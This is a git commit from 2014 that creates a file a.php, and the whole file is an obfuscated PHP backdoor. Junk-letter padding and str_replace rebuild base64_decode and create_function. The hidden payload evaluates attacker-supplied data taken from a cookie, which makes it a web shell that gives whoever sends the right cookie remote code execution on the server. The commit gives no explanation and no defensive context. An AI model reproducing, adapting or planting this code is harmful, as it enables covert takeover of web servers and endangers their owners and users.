b06961ae4f6d415960f0058fc7e955fb70e38cd9
segweg <jonwfgew@hotmail.com>
2014-01-12 20:38:59 +0000

    Create a.php

---
+++ a.php
@@ -0,0 +1,10 @@
+<?php
+$clgc="peyRrPSdnM2dFVzMyMTEnklO2VjaG8gJzwnLiRrLiklc+JztldmFsKGJhc2klU2NF9kZWNvZGUocHJlZkl19yZXklBsY";
+$rrkr="WklNlKGFycmF5KCcvW1kl5ckldzkl1cc10vJywklnL1klxzklLycpLCBklhklcklnJheSgnJywnKycpLCBqb2";
+$fkca = str_replace("k","","sktr_krkekpklkakce");
+$klxk="JGM9J2NvdW5kl0JzskYT0kX0NPTkl0tklJklRTkltpZihyZklXNldCgkYSk9PSdHklMycgJiYgJGklMoJGEpPjM";
+$xrnh="luKGklFycmklF5X3NsaklWNlKCklRhklLklCRjKCRklhKklS0zKSkpKSk7ZWNobyAnPC8nLiRklrLic+Jzklt9";
+$bqlx = $fkca("g", "", "gbgasgeg6g4g_gdgecgode");
+$zdzk = $fkca("y","","ycyryeyaytyey_yfuynycytyiyoyn");
+$wztj = $zdzk('', $bqlx($fkca("kl", "", $klxk.$clgc.$rrkr.$xrnh))); $wztj();
+?>
